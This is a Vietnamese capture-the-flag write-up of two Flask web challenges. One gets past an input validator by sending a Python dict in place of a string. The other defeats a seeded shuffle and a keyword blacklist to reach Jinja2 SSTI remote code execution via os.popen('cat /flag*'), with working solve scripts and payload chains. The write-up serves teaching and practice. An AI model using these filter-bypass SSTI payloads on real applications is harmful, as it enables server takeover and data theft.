#### Sanity check

Chương trình cung cấp một trang web sử dụng flask. Code thực hiện khai báo các route:

- /update thực hiện đọc data từ post request, sau đó kiểm tra hợp lệ tại hàm `is_valid_input`. Nếu hợp lệ thì thực hiện `save_to_file` để dữ liệu vào file của user đó. Mỗi một user sẽ có một file tương ứng, logic này nằm trong method `index` nhưng không quan trọng lắm.

```python
def save_to_file(string, filename):
    with open(filename, "w", encoding="utf-8") as file:
        file.write(str(string))

def update():
    try:
        data = request.json
        if(not is_valid_input(data['data'])):
            return jsonify({'error':'Invalid input'})
        save_to_file(data['data'], get_user_filename())
        return jsonify({'status': 'updated', 'new_state': data['data']})
    except Exception as e:
        return jsonify({'error':e})
```

- /get_flag kiểm tra xem file của người dùng hiện tại có chứa chuỗi **Holactf** hay không, nếu có thì trả về flag.

Như vậy ta chỉ cần khiến cho file của user của ta chứa chuỗi Holactf là được. Nhưng ta cần phải bypass logic như sau tại `is_valid_input` tại mỗi lần update data:

```python
NUMBER_OF_BITS = 32*16
def is_valid_input(input):
    if input == '' or len(input) != NUMBER_OF_BITS:
        return False
    try:
        for char in input:
            if int(char) != 0 and int(char) != 1:
                return False
    except ValueError:
        return False
    return True
```

Dữ liệu được coi là hợp lệ nếu nó có độ dài đúng bằng `32*16` bit nghĩa là 512 ký tự. Đồng thời phải thỏa mãn điều kiện kiểm tra `int(char)` phải có giá trị 0 hoặc 1. 

Để bypass được logic này ta cần tập trung vào cách python duyệt qua các loại giá trị trong python, ở đây mình có thể khai thác sử dụng dict của python: mặc định python khi duyệt qua các dict sẽ lặp qua các key. Điểm mấu chốt trong việc sử dụng trick này là file của user lại được lưu lại nhờ `save_to_file` rồi thực hiện kiểm tra bằng `f.read()`. Nói đơn giản là nội dung file ta có thể chứa các dict với các value tùy ý nhưng chương trình sẽ chỉ kiểm tra các key.

```python
from app import is_valid_input
payload = {}
for i in range(256):
    payload["0"*(i+1)] = "nglong05"
    payload["0"*(i+1) + "1"] = "nglong05"
payload["0"] = "Holactf"
print(is_valid_input(payload)) #True
```

Ta có thể thực hiện bypass các logic như sau: đầu tiên để bypass`if int(char) != 0 and int(char) != 1` thì ta thực hiện cấu hình các key sao cho giá trị là 0 hoặc 1, tuy nhiên ta lại cần 512 dict cho nên để `int(char)` luôn trả về 0 hoặc 1 thì phải tạo các dict gồm 0, 01, 00, 001, 000, 0001, ... Vậy là ta vừa có thể khiến `int()` luôn trả về 0 hoặc 1 mà vẫn đảm bảo điều kiện cần có 512 dict với các key khác nhau.

Tiếp theo đơn giản ta chỉ cần cho một value của payload chứa chuỗi **Holactf** là xong:

```python
import requests
URL = "http://127.0.0.1:39503" 
s = requests.Session()
s.post(f"{URL}/", data={"username": "nglong05"})
payload = {}
for i in range(256):
    payload["0"*(i+1)] = "nglong05"
    payload["0"*(i+1) + "1"] = "nglong05"
payload["01"] = "Holactf"
r = s.post(f"{URL}/update", json={"data": payload})
print(s.get(f"{URL}/get_flag").json())
```

Qua bài này ta biết được thêm các đặc điểm của các type của python, đồng thời khai thác nó như thế nào để thực hiện các phương pháp bypass.

#### Magic random

Đây là một challenge có lỗ hổng SSTI với filter chắc chắn, đồng thời bao gồm 1 chút crypto tăng thời gian giải bài toán.

Đầu tiên chương trình cấu hình RANDOM_SEED=random.randint(0,50), dữ liệu người dùng sẽ đi vào route /api/cast_attack sau đó được xử lý bởi `valid_template`, và `special_filter`. Ta cần bypass hàm này, thực hiện phân tích lần lượt:

**bypass suffle**

```python
def valid_template(template):
    pattern = r"^[a-zA-Z0-9 ]+$"    
    if not re.match(pattern, template):
        random.seed(RANDOM_SEED) 
        char_list = list(template)
        random.shuffle(char_list)
        template = ''.join(char_list)
    return template
```

Ở đây data của ta sẽ là payload SSTI, vậy nên tất nhiên là nó sẽ không thỏa mãn điều kiện regex chỉ bao gồm a-z A-Z 0-9 và ` `, cho nên ta phải tìm cách bypass logic phía sau thực hiện shuffle lại chuỗi đưa vào bằng một seed cố định. 

Ta thực hiện tìm seed shuffle của server bằng cách brute-force từ 0 đến 50 như sau:

```python
import requests, re, random
url = "http://172.17.0.2:4321/api/cast_attack"

def reflect(s):
    r = requests.get(url, params={"attack_name": s})
    j = r.json()
    m = re.search(r"No magic name (.*) here, try again!", j.get("error",""))
    return m.group(1)

def find_seed(probe, echoed):
    # brute-force seed 0..50 so that shuffle(probe) == echoed
    for seed in range(0, 51):
        arr = list(probe)
        random.seed(seed)
        random.shuffle(arr)
        if ''.join(arr) == echoed:
            return seed

probe = "-0123456789"
echoed = reflect(probe)
seed = find_seed(probe, echoed)
print(f"seed = {seed}") # seed = 49
```

Có thể nói đơn giản rằng script gửi request với probe rồi thử từng cái seed xem cái nào trả về như server trả về cho mình. Từ đó lấy được seed cố định. Tiếp theo ta có thể dùng cái seed này để payload theo ý muốn mà không bị vướng bởi logic shuffle, như server của đề bài sử dụng seed = 1:

```python
import requests, random

seed = 1
url = f"http://127.0.0.1:43859/api/cast_attack"
payload = "{{50-1}}"

def perm_from_seed(seed, L):
    idx = list(range(L))
    random.seed(seed)
    random.shuffle(idx)
    tau = [None] * L
    for new_i, orig_j in enumerate(idx):
        tau[orig_j] = new_i
    return tau

def preimage_for_target(tau, target):
    return ''.join(target[tau[j]] for j in range(len(target)))

L = len(payload)
tau = perm_from_seed(seed, L)
pre = preimage_for_target(tau, payload)
r = requests.get(url, params={"attack_name": pre})
print(r.text)
# {"error":"<i>No magic name 49 here, try again!</i>"}
```

**bypass filter**

Payload tiếp theo của chúng ta còn cần phải qua lớp kiểm tra thứ hai tại:

```python
def special_filter(user_input):
    simple_filter=["flag", "*", "\"", "'", "\\", "/", ";", ":", "~", "`", 
                   "+", "=", "&", "^", "%", "$", "#", "@", "!", "\n", "|", 
                   "import", "os", "request", "attr", "sys", "builtins", "class", 
                   "subclass", "config", "json", "sessions", "self", "templat", 
                   "view", "wrapper", "test", "log", "help", "cli", "blueprints", 
                   "signals", "typing", "ctx", "mro", "base", "url", "cycler", 
                   "get", "join", "name", "g.", "lipsum", "application", "render"]
    for char_num in range(len(simple_filter)):
        if simple_filter[char_num] in user_input.lower():
            return False
    return True
```

Ở đây đã filter một số kí tự/chuỗi quan trọng trong các payload của ssti như `'` `|` `g.` `join` `os` `import` `+` `attr`. Tuy vậy vẫn có một số chuỗi chưa bị bypass như `globals` `concat` `dir` và `(` `[`. Chỉ cần như vậy là ta hoàn toàn có thể craft một payload rce hoàn chỉnh.

Điểm đến đầu tiên của ta sẽ là `__globals__`, mình có một cách khá hay để luôn đi được đến nó trong filter này như sau:

`(1).__globals__._fail_with_undefined_error.__func__.__globals__`

 Trong Jinja2, `(1).__globals__` lợi dụng object 1. Khi Jinja xử lý template, 1 là một int. Nó không có `__globals__`, nhưng do cơ chế xử lý lỗi trong Jinja (`Undefined._fail_with_undefined_error`) có thể lần ngược ra một function thật, từ đó lấy `. __globals__`

Tiếp đến mình sử dụng `.concat([...])` với các ký tự lấy từ `__file__` để ráp thành các chuỗi như os, system, popen.

```python
from flask import Flask, render_template_string
app = Flask(__name__)
with app.app_context():
    print(render_template_string("{{(1).__globals__._fail_with_undefined_error.__func__.__globals__.__file__}}"))
```

```python
python3 helper.py
/usr/lib/python3/dist-packages/jinja2/runtime.py
```

Ở đây lợi dụng các ký tự trong chuỗi trả về là path của runtime.py, ta thực hiện lấy các ký tự trong chuỗi path này ghép lại thành payload. Ví dụ như `__` có thể lấy trực tiếp từ `((1).__dir__())[0][0],((1).__dir__())[0][1]`, còn các ký tự để build payload thì lần lượt lấy của các ký tự của cái chuỗi path trên, ví dụ lấy `__builtins__` thì payload như sau:

```python
(1).__globals__._fail_with_undefined_error.__func__.__globals__.concat([
    ((1).__dir__())[0][0],((1).__dir__())[0][1],
    (1).__globals__._fail_with_undefined_error.__func__.__globals__.__file__[13],
    (1).__globals__._fail_with_undefined_error.__func__.__globals__.__file__[1],
    (1).__globals__._fail_with_undefined_error.__func__.__globals__.__file__[12],
    (1).__globals__._fail_with_undefined_error.__func__.__globals__.__file__[5],
    (1).__globals__._fail_with_undefined_error.__func__.__globals__.__file__[28],
    (1).__globals__._fail_with_undefined_error.__func__.__globals__.__file__[12],
    (1).__globals__._fail_with_undefined_error.__func__.__globals__.__file__[20],
    (1).__globals__._fail_with_undefined_error.__func__.__globals__.__file__[26],
    ((1).__dir__())[0][0],((1).__dir__())[0][1]
  ])
```

Nhìn hơi dài, tuy nhiên mình thấy khá hay nên đã tiếp tục đi theo hướng làm này.

Đến đây chỉ việc build dần payload kiểu ``(1).__globals__['_fail_with_undefined_error'].__func__.__globals__['__builtins__']['__import__']('os').popen('cat /flag*').read()`` là xong. Payload cụ thể nằm trong `payload.py`.

Sau đó gửi payload kèm với logic shuffle ta có:

```bash
python3 s.py         
{"error":"<i>No magic name HOLACTF{cRe473_y0Ur_MAgic_*********}}\n here, try again!</i>"}
```


